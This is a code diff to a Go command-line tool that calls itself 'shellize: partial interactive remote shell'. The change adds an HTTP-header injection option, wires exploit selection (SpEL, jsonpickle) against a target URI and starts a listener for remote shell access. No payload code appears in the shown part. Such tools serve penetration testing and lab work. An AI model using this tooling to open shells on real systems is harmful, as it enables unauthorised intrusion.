@@ -17,6 +17,7 @@ type CmdLine struct {
 	Uri     string
 	Method  string
 	Exploit string
+	Header  string
 }
 
 var c CmdLine
@@ -28,6 +29,7 @@ func parseCmd() {
 	flag.StringVar(&c.Uri, "u", "http://localhost:8080", "URI for the vulnerable application")
 	flag.StringVar(&c.Method, "m", "GET", "HTTP method to use")
 	flag.StringVar(&c.Exploit, "e", "spel", "Exploit to use")
+	flag.StringVar(&c.Header, "h", "", "HTTP Header to use for injection")
 
 	flag.Parse()
 }
@@ -65,8 +67,7 @@ func cmdFunction(t string) {
 
 func main() {
 	parseCmd()
-	//var expl = exploit.Spel{} // how to parametrize?
-	//var expl = exploit.Jsonpickle{}
+
 	var expl = exploit.GetExploit(c.Exploit)
 	if expl == nil {
 		exploit.PrintAvailableExploit()
@@ -79,6 +80,7 @@ func main() {
 	e.Method = c.Method
 	e.Host = c.Host
 	e.Port = c.Port
+	e.Header = c.Header
 
 	var l = new(listener.Endpoint)
 	l.Address = c.Host
@@ -101,7 +103,7 @@ func main() {
 		c.Complete,
 		prompt.OptionTitle("shellize: partial interactive remote shell"),
 		prompt.OptionPrefix(">>> "),
-		prompt.OptionInputTextColor(prompt.Yellow),
+		prompt.OptionInputTextColor(prompt.Green),
 	)
 	fmt.Println("shellize: partial interactive remote shell")
 	p.Run()
